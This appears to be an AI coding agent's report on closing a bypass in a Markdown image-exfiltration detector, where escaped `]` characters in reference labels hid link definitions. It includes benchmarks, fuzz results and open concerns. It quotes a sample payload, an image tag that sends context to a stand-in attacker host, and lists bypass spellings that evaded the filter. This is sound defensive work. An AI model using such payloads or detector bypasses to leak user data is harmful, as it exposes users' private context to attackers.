STATUS: DONE_WITH_CONCERNS

# T83 — closing T82#F-001 (a backslash-escaped `]` in a reference label hides the definition)

Scope was the one finding that fires the `RESIDUALS.md` exception — blocker, reproduced at a public
boundary — and nothing else. T82#F-002 (test durability), F-003 (Greek sigma), F-004 (link keyword
list) and F-005 (probe artifact) were not re-opened; they stay documentation-grade.

Files changed: `src/security/detect/exfil.ts`, `src/security/detect/exfil.test.ts`. **No change to
`docs/requirements/keryx-agent-first-core/policies.md`** — see «Why the normative text did not move»,
and Concern 2, which is the part a reviewer should rule on.

## Baseline, reproduced before any edit

`T82-escape.ts` unmodified: `bypasses: [s01EscapedClose, s02EscapedCloseShort, s03EscapedCloseFull,
s04EscapedCloseCollapsed, s05TwoEscapedCloses]`, each `detectorFindings: 0`, `mcpState: "none"`, all
four boundary flags `true`. My baseline log hashes
`2f86456d015816ee1837b6aa736bd789e752c4c3906238d2f5144ca19fe81ae3` — **byte-identical to the hash
T82 recorded for its own run**, so the finding reproduces exactly rather than approximately.

## Part 1 — what the defect actually is, stated so it is not repaired a second time

`REFERENCE_DEF = /^[ \t]*\[([^\]]+)\]:\s*(?:<([^<>\n]*)>|(\S+))/gm`.

`[^\]]+` cannot cross a `]`. Two consequences, and they are the same fact seen from two sides:

- the `]` the pattern matched was **always the first one** after the opening bracket, and the line
  matched **only** when that first `]` was immediately followed by `:` — backtracking can only
  shorten the capture, and a shorter capture needs a `]` *earlier* than the first, which does not
  exist. That is the whole of the pattern's semantics;
- so a definition whose label carries a backslash-escaped `]` matched **nothing at all**.
  `[foo\]]: URL` has another `]` where the `:` has to be. `refs` stayed empty, `refs.size > 0` gated
  the entire reference pass off, and the document produced **zero findings** — while CommonMark («a
  link label ends with the first right bracket that is not backslash-escaped») and `marked` both
  resolve `![foo\]]` and emit the `<img>`.

The **use** side was never the problem, and this is the observation the repair is built on. For every
reachable spelling — shortcut `![foo\]]`, short `![x\]]`, full `![alt][foo\]]`, collapsed
`![foo\]][]`, multi-escape `![a\]b\]c]` — the candidate label span `readBracketConstructs` builds runs
from `[`+1 to the **first** `]`, i.e. the raw bytes `foo\`. What was missing was a table key equal to
that.

## Part 2 — the two alternatives, and why the chosen one is neither of them exactly

**(A) Full escape handling.** Widen the definition capture *and* give `descriptionEnds` a third
candidate end at the first unescaped `]`. Faithful, and the expensive one: a third candidate span per
opening bracket is a direct attack on the disjointness argument, and an escape-aware end can sit past
a `]` another span's end sits on, so two spans can share bytes. It also moves the **use** side, which
`exfil.ts:529-531` forbids in the release direction — honouring `\]` there would remove `![a\](URL)`,
which is flagged today.

**(B) Over-approximate at the definition site** — flag any definition-shaped line whatever its label
contains. Cheap, no new candidate spans, but as stated it flags a definition's URL with **no
resolving use at all**: every `[a\]b]: https://example.org/x` quoted in a document becomes a masked
URL whether or not anything points at it. That is a far wider false-positive surface than the defect.

**What is implemented is (B) narrowed until it is as faithful as (A) on every spelling a renderer
fetches, at (B)'s cost.** The definition site registers the key the **use** side already produces:
the label read escape-aware (so the line is recognised at all) and then **truncated at its first
`]`**. Measured, not argued:

- every spelling `marked` fetches is a finding — 5 reviewer spellings + 16 of mine, all four public
  boundaries, `rendererFetchesButNoFinding: []` (`T83-after-escape.log`);
- the false positives are enumerated rather than hand-waved: two labels that differ only *after*
  their first `]` collide, and both must carry a backslash escape inside a bracket run for the
  collision to exist. Cost is one extra masked URL, the same direction and the same remedy — the
  allowlist — as the duplicate-definition over-approximation T81 already ships;
- the benign corpus does **not** grow: 16 files / 62 findings / Part B 7 flagged, byte-identical.

Justified on cost and false positives, as the dispatch asked, not on elegance: (A) costs the
disjointness argument and a release on the use side; (B) as offered costs a masked URL for every
quoted escaped definition; this costs a masked URL only when two escaped labels share a prefix.

## Part 3 — what this does to the disjointness argument (the question asked first)

T81's argument, in three steps: (i) no key can contain `]`, because the capture is `[^\]]+`;
(ii) `normaliseLabel` neither adds nor removes a `]`; so `readLabel` may reject any span carrying one
as a **necessary** condition; (iii) with the `[` threshold at its ordinary 0, a surviving span carries
no bracket at all, so the `[` opening it is the last `[` before the `]` closing it, no two spans share
an endpoint, the spans are pairwise **disjoint**, and their total length is at most `content.length`.

**The argument survives. Step (iii) is untouched and step (i) is stronger.** Only step (i)'s *reason*
changes:

> a key is the label's bytes **up to its first `]`**, so no key contains `]` — by construction of the
> truncation, not by the negated character class of a regex.

That is the stronger statement: it holds for every label the scanner recognises, escape-aware or not,
and it does not depend on any pattern surviving a future edit. (ii) and (iii) follow unchanged, and so
does the reviewer's tighter form — total candidate span length ≤ `(maxOpenBrackets + 1) ×
content.length` with **no budget at all** — because that form depends only on `maxOpenBrackets`, which
this change computes from the same keys by the same loop. `LABEL_WORK_FACTOR = 8` therefore still
binds only when a document defines a key carrying 8 or more `[`, exactly as T82 established.

Pinned, not asserted: `T83#F-001: every label the definition scanner accepts still resolves when used`
drives 125 generated labels built from `a`, `\]`, `\\`, `\[`, `b` through the shipped detector. It is
the *observable* form of step (i) — a key holding a `]` could never be matched, because `readLabel`
rejects every span carrying one, so the finding would vanish silently. The test fails on the
pre-change tree and passes now.

The escape-aware reading gets a **second, separate disjointness argument of its own**, and it is why
it is bounded rather than quadratic: it refuses a label carrying an unescaped `[`. That is faithful
(CommonMark forbids one, and `marked` renders no image for `![a\]b[c]` — measured, `m01`/`m02` in
`T83-after-escape.log`), and it means two line-start `[` cannot both survive with the same terminator
— the second would sit inside the first's label. The slices this reading takes are therefore pairwise
disjoint and total at most `content.length`.

## Part 4 — the mechanism, and the pre-existing cost defect it must not compound

Measured on the pre-change tree, driving `detectExfil` directly:

| shape | bytes | ms | exponent |
|---|---|---|---|
| `lineStartOpensNoClose` (`"[aaaaaaaaa\n".repeat(n)`) | 352 000 | **5 823.5** | **2.01** |
| `lineStartOpensIndented` | 416 000 | **6 949.1** | **2.01** |
| `lineStartOpensBackslash` | 352 000 | **5 966.9** | **2.01** |
| `lineStartOpensCarriageReturn` | 352 000 | **6 039.8** | **2.03** |
| `nestedOpensOneEscapedClose` | 64 041 | **1 069.0** | **1.99** |

`REFERENCE_DEF` was **already quadratic at HEAD** on a document with many line-start `[` and no `]`:
`[^\]]+` crosses newlines, so every line-start `[` scanned to end-of-content and backtracked, once per
line. At a public boundary the same shape read **24 643.6 ms at 704 000 bytes**
(`T83-before-cost-boundary.log`). Ten rounds missed it because every adversarial shape any of them
built contained a `]`.

That is decisive for **how** the repair is implemented. Adding a second, escape-aware *pattern* beside
the first measures 762–1 849 ms on the same shape on top of the existing 1 432 ms at 176 KB — it would
roughly double a live denial of service in the mandatory floor. So the regex scan is replaced by one
hand-written linear scanner, `readReferenceDefinitions`:

1. one O(n) left-to-right pass recording every `]`, every `]` **not** preceded by an odd run of `\`,
   and every unescaped `[` — ascending, so every question below is a binary search;
2. a walk over line starts (index 0 and every position after `\n`, `\r`, ` `, ` ` — the
   positions JS `^` matches under `/m`), skipping `[ \t]*`, requiring `[`;
3. **reading 1**, the replaced pattern character for character: the first `]` terminates the label and
   must be followed by `:`; same key, same destination sub-pattern (`\s*(?:<([^<>\n]*)>|(\S+))`, now
   sticky), same URL, same offset. It alone advances the cursor, exactly as `lastIndex` did;
4. **reading 2**, CommonMark's, reached only when that first `]` is backslash-escaped — which is
   precisely the case reading 1 cannot see. The label ends at the first unescaped `]`, may not carry
   an unescaped `[`, and the key is still the prefix before the first `]`.

Reading 2 **never moves the cursor**. That is not a smaller change than moving it, it is the
difference between additive and a release: with the cursor moved, `[a\]b\n[c]: URL` would have its
`[c]` definition swallowed by the preceding line's read.

After, on the same shapes (`T83-after-cost-ladder.log`):

| shape | largest bytes | before ms | after ms | before exp | after exp |
|---|---|---|---|---|---|
| `lineStartOpensNoClose` | 352 000 | 5 823.5 | **4.3** | 2.01 | 0.70 |
| `lineStartOpensIndented` | 416 000 | 6 949.1 | **4.3** | 2.01 | 1.03 |
| `lineStartOpensBackslash` | 352 000 | 5 966.9 | **3.6** | 2.01 | 0.95 |
| `lineStartOpensEscapedClose` | 320 000 | 8.6 | 11.0 | 0.58 | 0.73 |
| `lineStartOpensCarriageReturn` | 352 000 | 6 039.8 | **4.1** | 2.03 | 0.92 |
| `nestedOpensOneEscapedClose` | 64 041 | 1 069.0 | **10.5** | 1.99 | 0.88 |
| `backslashRunKey` | 128 041 | 11.4 | 12.7 | 0.71 | 0.84 |
| `escapedDefsThenBangRun` | 1 440 001 | 22.4 | 52.8 | 0.95 | 0.81 |
| `escapedDefsAllResolving` | 1 897 780 | 21.6 | 156.3 | 0.95 | 1.06 |
| `prose_oneEscapedDef` | 672 049 | 1.8 | 4.7 | 1.06 | 0.99 |
| `balancedNest_withLongDef` (T81's worst, control) | 96 029 | 19.9 | 16.9 | 1.28 | 1.11 |

`overOneSecond` `[5 shapes]` → **`[]`**; `superLinear` `[5 shapes]` → **`[]`**; every exponent
0.70–1.11.

The removal of the quadratic is a **side effect of the mechanism**, not a second repair, and it is
reported with numbers rather than folded into the headline. Concern 1 says what a reviewer should do
with it.

### The dials, at CONSTANT total size (262 144 bytes)

A bound an attacker can inflate shows up here as a climbing column.

| dial | before (ms across the dial) | after |
|---|---|---|
| escaped definition count 1 → 5 000 | 2.1 → 2.3 (spread 1.2) | 2.8 → 5.7 (spread 3.0) |
| escaped label length 1 → 100 000 | 0.7 → 0.8 (spread 0.1) | 1.9 → 2.2 (spread 0.3) |
| backslash run in label 0 → 60 000 | 0.7 → 0.8 (spread 0.3) | 2.0 → 2.3 (spread 0.4) |
| line-start opens sharing one close 1 → 20 000 | 0.8 → **432.9** (spread 432.1) | 1.9 → **7.3** (spread 5.4) |

T82's own six dials, re-run: spreads 2.3 / 14.9 / 4.1 / 36.8 / 25.5 / 31.5 ms — every dial moves cost
by a bounded factor, none by an order (`T83-after-T82-cost-sweep.log`).

### The four public boundaries

| shape | bytes | before worst ms | after worst ms |
|---|---|---|---|
| `lineStartOpensNoClose` | 176 000 | **1 489.9** | 10.0 |
| `lineStartOpensNoClose` | 352 000 | **6 038.8** | 19.9 |
| `lineStartOpensNoClose` | 704 000 | **24 643.6** | 40.3 |
| `nestedOpensOneEscapedClose` | 64 041 | **1 940.8** | 13.2 |
| `nestedOpensOneEscapedClose` | 128 041 | **4 668.4** | 28.3 |
| `escapedDefsAllResolving` | 937 780 | 67.1 | 250.7 |
| `escapedDefsAllResolving` | 1 897 780 | 130.5 | 499.8 |
| `escapedDefsAllResolving` | 3 817 780 | 287.7 | **1 126.4** |

`boundariesOverOneSecond` before: five rows. After: **one**, and it is at **3.8 MB**, outside the
megabyte the criterion names.

**Worst shape found under a megabyte, and its cost: T82's own `resolvingBangUses` at 1 048 618 bytes —
715.4 ms at `validateOutputForTransport`** (`T83-after-T82-boundary-resolvingBangUses-1mb.log`),
against the 676.8 ms T82 measured; the difference is this machine's disclosed variance, not this
change. `balancedNest_withLongDef` at 1 048 587 bytes reads 474.1 ms. My own worst under a megabyte is
`escapedDefsAllResolving` at 937 780 bytes, 250.7 ms.

## Part 5 — nothing else moved

### Prior matrices — 18 of 19 byte-identical to T82's own logs

Runner: `T83-matrices.sh`. Each probe was compared not just by hash to a recorded table but **byte for
byte against the log T82 itself produced on the pre-T83 tree**, and every hash also equals T81's
recorded value, so the agreement is now **seven-way** (T66/T72/T77/T78/T81/T82/**T83**):

`T42-exfil-attack 0646c508…`, `T24-recheck2-exfil 8c9bfec0…`, `T42-charrefs 698d8899…`,
`T53-extract ad20286b…`, `T53-resolve 06037910…`, `T53-base 3416d62e…`, `T53-boundary 398012ce…`,
`T42-boundary 7030455d…`, `T24-recheck2-boundary 83839962…`, `T52-base a04404db…`,
`T46-surfaces d8348c99…`, `T72-md 15866b62…`, `T72-gates e4d04c18…`, `T72-srcset 2e96f8d7…`,
`T72-doc 69df9705…`, `T77-doc bee36307…`, `T78-md 4a9034bc…`, `T78-corpus 3fb901e3…`.

One moved, and it is the whole-repository scan: `T53-corpus` `c2987734…` → `0eebf4b0…`.

### The corpus delta, enumerated rather than narrated (T78#F-003's demand)

The **entire** diff of the two logs is Part A's header:

| | T82's run | mine |
|---|---|---|
| `filesScanned` | 23 301 | 23 351 |
| `totalFindings` | 626 | 628 |
| `filesWithFindings` | 100 | 102 |
| `egress.html-image-exfil` | 390 | 392 |
| every other `byPolicy` id | — | unchanged |
| `benignFilesWithFindings` | 16 | **16** |
| `benignFindings` | 62 | **62** |
| Part B flagged | 7 | **7**, the same ids |

Enumerated: every file in the four directories this task wrote to that is newer than T82's own corpus
run — 59 of them — was driven through `detectExfil`. Exactly **two** carry findings that were not
counted before, one finding each, both `egress.html-image-exfil`:

- `…/artifacts/T82-review.md` — the reviewer's own artifact, written **after** its corpus run, which
  quotes `<img src="https://attacker.invalid/p?ctx=CTX">`. Not mine, and it would have moved the
  header whatever I did;
- `…/artifacts/T83-spec.md` — mine, quoting the same sentence.

The 30 `T83-*` log files carry **zero** findings (`T83-corpus-delta.log`). `exfil.ts` and
`exfil.test.ts` were already counted and their counts did not change — `egress.markdown-image-exfil`
is 87 on both sides — because the definitions my new test cases contain sit inside template literals,
mid-line, where `^[ \t]*\[` does not reach.

### Differential fuzz — the claim that reading 1 reproduces the pattern

`T83-parity.ts` builds **24 000** documents from a seeded generator over the characters the pattern is
sensitive to (`[`, `]`, `\`, `\]`, `\[`, `\\`, `:`, `!`, `![`, spaces, tabs, `\n`, `\r`, angle
brackets, two URLs, `&#93;`, `İ`, `ΟΣ`), half random atom strings and half definition-shaped with a
random label, indent, destination form, gap and use spelling. Every finding's offset, length and value
is recorded, on the pre-change tree and on the post-change tree, and diffed:

- **releases: 0.** Not one finding present before is absent after.
- additions: 640, one per document, and **all 640 come from a document containing `\]`** — verified by
  regenerating the corpus with the same seed and checking each added row's document.

`T83-parity-diff.log`, `T83-before-parity.log`, `T83-after-parity.log`.

### Reviewer probes, before and after

| Probe | before | after |
|---|---|---|
| `T82-escape.ts` | `bypasses: [s01…s05]`, each 0 findings / `state:"none"` / four boundary flags true | **`bypasses: []`**, each 1 finding / `state:"redacted"` / no boundary carries the host |
| `T82-dup.ts` | `zeroClickLeaks: [e1EscapedCloseInLabel, e2EscapedCloseDup]` | **`zeroClickLeaks: []`**; **only those two rows changed**, the other 27 are byte-identical, so the duplicate-definition behaviour is unchanged |
| `T82-cost.ts ladder` | `overOneSecond: []`, `superLinear: [bangRunManyCloses_longDef, manyDefsThenBangRun]` | `overOneSecond: []`, `superLinear: [manyDefsThenBangRun]` — one fewer, none added |
| `T82-boundary.ts budget` | `62595fb8…` | `62595fb8…` — **byte-identical**; budget exhaustion still flags and the allowlist still releases |

### Suites, types, lint

- `bun test src/security/detect/exfil.test.ts src/security/output-validation.test.ts
  src/mcp/structural-redaction.test.ts src/security/persistence-sinks.test.ts` →
  **115 pass / 0 fail / 1 281 expect(), exit 0**. T82 recorded 112 / 0 / 1 168; the deltas are the
  three tests added here.
- Red evidence: on the pre-change tree the same file was **62 pass / 2 fail** — the escape test at
  `s01EscapedClose:false` and the definition-scan cost test at
  `[lineStartOpensNoClose=7147.7ms, lineStartOpensNoCloseIndented=8726.0ms,
  lineStartOpensBackslashNoClose=6430.0ms, lineStartOpensCarriageReturn=7116.3ms]` — and the third
  test was rewritten precisely because its first draft passed before the change, which is a broken
  test rather than a passing one.
- `bun run typecheck` (`tsc --noEmit`) → clean.
- `bunx eslint src/security/detect/exfil.ts src/security/detect/exfil.test.ts` → 0 problems.

### Tooling disclosure

`bun` was invoked directly for every probe and suite rather than through `keryx ctx run`: the
per-shape timings and per-case verdicts ARE the evidence and this project's compaction elides them —
the same disclosure T46, T53, T63, T66, T71, T72, T77, T78 and T81 each made. `keryx ctx rg` and
`keryx ctx read` were used for every code and document search; **the routed summary silently dropped
rows in three of five searches** (22 matches with 4 rows shown, 13 with 4, 9 with 4), so the raw logs
under `.metaproject/data/gdctx/raw/` were read directly with the hook's own escape marker and a stated
reason. No raw `rg`/`grep` ran otherwise.

No git state change, no network, no model call, no dependency change, no flow-state edit. Synthetic
and reserved hosts only (`attacker.invalid`, `ok.example.org`, `cdn.example.org`, `ci.example.org`,
`example.org`, `docs.example.org`). The implementation file was reverted twice, in place, to obtain
the before-measurements — restored each time and verified by hash
(`63ea36a6606edd2b6d734d2ee0efc10ab146dd223d348a81c87a4f5eb3d623d0`). No `git stash`, no worktree
touched.

## Why the normative text did not move

The dispatch permits editing the auto-fetch subsection of `policies.md` **only if** this change makes
its current wording untrue.

- «перечень полный, не пример» over the reference spellings was **false while F-001 was open** — T82
  named it in F-001's `class_scope` for exactly that reason — and becomes **true** again now.
  T81's precedent applies: making a false sentence true is not a reason to edit it.
- «ограничения на длину label нет: единственный критерий — определён ли такой label в самом
  документе» stays true. Nothing added here is a length bound.
- «Label у reference сопоставляется так, как его сопоставляет CommonMark … одинаково у определения и
  у использования» was **already untrue** before this change, in the *release* direction: an
  escaped-`]` label was matched by neither side. It is still not exactly CommonMark's rule, but now in
  the *flagging* direction and only for labels carrying an escape. My change therefore did not **make**
  it untrue, which is the condition the dispatch sets, so I did not edit it — but a reader is entitled
  to know the deviation exists, and that is Concern 2 rather than a silent omission.
- `Version:` stays at `0.1.4`, and `T72-doc`/`T77-doc` are byte-identical.

## Concerns

1. **`REFERENCE_DEF` was quadratic at HEAD, and I removed it as a side effect rather than as a
   decision anyone made.** 24 643.6 ms at a public boundary on 704 000 bytes of `[aaaaaaaaa\n`, 2.01
   exponent, ten rounds of adversarial shapes that all missed it because they all contained a `]`.
   By the scope decision's own criterion — blocker, reproduced at a public boundary — it fires the
   same exception T82#F-001 fired, and it is now closed; but I am the implementer, and *declaring* the
   exception is not mine. A reviewer should decide whether it needed its own round. The mechanism was
   not optional: the alternative (a second escape-aware pattern) doubles that reading, and my own
   acceptance criterion forbids a shape over a second under a megabyte.
2. **Label matching is now an over-approximation for escaped labels, and the normative sentence does
   not say so.** Two labels that differ only after their first `]` share a key, so
   `[a\]b]: X` + `![a\]c]` produces a finding a renderer would not fetch. Both labels must carry a
   backslash escape inside a bracket run. Zero instances in the benign corpus, and the remedy is the
   same allowlist as every other false positive in this floor — but if a reviewer judges the deviation
   worth naming, the edit is one clause in the auto-fetch subsection and a bump to `0.1.5`, and I did
   not make it because the dispatch's condition («*makes* its current wording untrue») was not met.
3. **A label carrying an unescaped `[` is deliberately not read as a definition by the escape-aware
   reading.** That is faithful (CommonMark forbids it; `marked` renders no image for `![a\]b[c]` or
   `![a\][b]` — both measured) and it is also what bounds that reading's cost. If a future renderer
   accepts such a label, this condition is where the floor would have to move, and the disjointness
   argument for reading 2 moves with it.
4. **The cost is linear, not free.** `escapedDefsAllResolving` — every escaped definition actually
   resolved by an image use — crosses a second at about **3.8 MB** (1 126.4 ms), against ~1.5 MB for
   T82's `resolvingBangUses`. It is the path this repair opens, and its constant is ~4× the
   pre-change one because the definitions are now genuinely resolved rather than invisible. Under a
   megabyte it reads 250.7 ms. The hard wall-clock guarantee is still a size cap at the boundaries —
   `dispatch.ts` / `guard.ts` territory, unchanged from T81's and T82's disclosure.
5. **T82#F-002's durability gap is not closed.** My unit test asserts at the detector, `applyRedaction`,
   `prepareOutputForPersistence` and `validateOutputForTransport` — the same four seams T81's test
   uses. `dispatchCallTool` and `redactToolOutput` are covered for these spellings by
   `T83-escape.ts` / `T82-escape.ts` (probe, not test), exactly as T82 measured them. Closing the gap
   is documentation-grade work that the scope decision keeps out of this round.
6. **Megabyte-scale timings are noisy on this machine** (T81 measured up to 5×). Every table above is
   best-of-three, and both sides of every before/after comparison were measured the same way.
